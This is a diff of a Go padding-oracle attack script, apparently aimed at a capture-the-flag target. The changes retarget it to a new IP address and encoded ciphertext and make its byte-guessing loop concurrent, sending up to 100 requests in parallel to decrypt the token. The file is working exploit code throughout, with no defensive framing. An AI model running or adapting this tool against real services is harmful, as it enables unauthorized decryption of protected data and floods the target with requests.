@@ -8,6 +8,7 @@ import (
 	"log"
 	"net/http"
 	"strings"
+	"time"
 )
 
 var (
@@ -20,9 +21,9 @@ var (
 
 const (
 	blockLen    = 16
-	url         = "http://35.227.24.107/4b511534dd/?post=%s"
+	url         = "http://34.94.3.143/9c22e50220/?post=%s"
 	errorString = "PaddingException"
-	parallel    = 5
+	parallel    = 100
 )
 
 func init() {
@@ -51,7 +52,7 @@ func encode(data []byte) string {
 	return encReplacer.Replace(b64)
 }
 
-var payload = "P4aMnxs6OAuplAJYRUtytvJjq!i2Rc6E1-k2raJ7!SjRgHt1cXEZyemUO62WCn88iA8BGyL-uvPbdwPQR6GE8jSEHZHiXXzhC-pLofE2Z2qN0Wj1mHOlx3dwjitDcvc!uHbsvwCcK!qp4FV3T5l8oKMSR7pJCVDAl!hp6t989eH4c5VWoUnEhxnVXyNQG6YNTr-aHPvpWhQV663CP23YSw~~"
+var payload = "TyS1hgsPVo0OMOmoDDOFuui8eQtwF9jEcVrlv-rbKjhBkDKfw-LVyq3SMyHFLQFGXjbUx6-XiYCCStcbzhAdXrE4omZKkmxR91!y-CRt2Py7IU02r!1rrgy3ZMEj1jpRGU5kMF5sdiTxpO2hgvaGvSyumasd0q6V06ofaMuYtvEpQdE5RCda4osINnRfoSaGkt50UDkv-bmlW4uIJ!LoyA~~"
 
 func main() {
 	var plaintext string
@@ -75,7 +76,6 @@ func main() {
 	for blockOffset := 0; blockOffset < blockCount-1; blockOffset++ {
 		// loop for every byte position inside the discovered block
 		ciphertext := cipher[blockOffset*blockLen : (blockOffset+2)*blockLen]
-
 		plaintext += string(revealBlock(ciphertext))
 	}
 
@@ -91,6 +91,7 @@ func revealBlock(ciphertext []byte) []byte {
 	for pos := blockLen - 1; pos >= 0; pos-- {
 		// reveal the byte
 		block[pos] = revealByte(ciphertext, pos)
+		fmt.Println(string(block))
 
 		// adjust padding for the next shot
 		for i := pos; i < blockLen; i++ {
@@ -105,30 +106,68 @@ func revealBlock(ciphertext []byte) []byte {
 // reveals a single byte of plaintext
 // requires cipher input of blockLen*2 and a position (0-blockLen)
 func revealByte(ciphertext []byte, pos int) byte {
+
+	// channels
+	chanVal := make(chan byte, 1)
+	chanPara := make(chan byte, parallel)
+	chanErr := make(chan error, 1)
+	chanDone := make(chan byte, 256)
+	var done int
 	validCipherByte := ciphertext[pos]
 
-	// try every possible byte value
-	for i := byte(0); i <= 255; i++ {
+	//try every possible byte value
+	for il := 0; il <= 255; il++ {
+		cipher := make([]byte, len(ciphertext))
+		copy(cipher, ciphertext)
+		// pos := pos
+		i := byte(il)
 
-		// play with byte at a given position
-		ciphertext[pos] = i
+		go func() {
+			chanPara <- 1
+			defer func() { <-chanPara }()
 
-		// send the payload and check for padding error
-		found, err := testRequest(ctx, ciphertext)
-		if err != nil {
-			log.Fatal(err)
-		}
+			// play with byte at a given position
+			cipher[pos] = i
 
-		if found {
-			val := i ^ (blockLen - byte(pos)) ^ validCipherByte
-			fmt.Println(string([]byte{val}))
-			return val
-		}
+			// send the payload and check for padding error
+			found, err := testRequest(ctx, cipher)
+			if err != nil {
+				//fmt.Print("E")
+				chanErr <- err
+				return
+			}
+
+			if found {
+				chanVal <- i
+			} else {
+				chanDone <- 1
+			}
+
+		}()
 	}
 
-	log.Fatal("failed to reveal byte")
-	return 0
+	ticker := time.NewTicker(100 * time.Millisecond)
 
+	for {
+		select {
+		case <-chanDone:
+			done++
+			if done == 256 {
+				log.Fatal("Failed")
+			}
+		case err := <-chanErr:
+			log.Fatal(err)
+		case found := <-chanVal:
+			// miodify the ciphertext with valid byte
+			ciphertext[pos] = found
+
+			// return the plaintext value
+			return found ^ (blockLen - byte(pos)) ^ validCipherByte
+		case <-ticker.C:
+			//fmt.Print("t")
+			break
+		}
+	}
 }
 
 func testRequest(ctx context.Context, data []byte) (bool, error) {
@@ -153,8 +192,6 @@ func testRequest(ctx context.Context, data []byte) (bool, error) {
 		return false, err
 	}
 	defer resp.Body.Close()
-
-	fmt.Print(".")
 
 	// determine padding error
 	return !strings.Contains(string(body), errorString), nil
